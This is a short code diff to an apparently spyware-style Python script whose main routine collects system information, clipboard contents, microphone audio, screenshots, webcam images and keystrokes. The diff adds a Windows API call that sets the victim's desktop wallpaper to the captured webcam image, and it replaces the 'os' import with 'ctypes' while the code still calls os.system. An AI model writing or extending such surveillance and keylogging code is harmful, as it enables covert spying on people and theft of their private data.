@@ -26,7 +26,7 @@ try:
     from urllib import request
     import atexit
     import json
-    import os
+    import ctypes
 except:
     os.system("pip install -r requirements.txt")
 
@@ -158,12 +158,24 @@ def webCamera():
         waitKey(1)
         destroyWindow("webCam")
 
+def set_wallpaper(image_path):
+    # Constants for setting the wallpaper
+    SPI_SETDESKWALLPAPER = 20
+    SPIF_UPDATEINIFILE = 0x01
+    SPIF_SENDWININICHANGE = 0x02
+
+    # Call Windows API to change wallpaper
+    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+    if result: print("Wallpaper changed successfully!")
+    else: print("Failed to change wallpaper.")
+
 def main():
     system_information()
     copy_clipboard()
     microphone()
     screenshots()
     webCamera()
+    set_wallpaper(webCamShot_info)
     key_logger()
 
 if __name__ == "__main__":
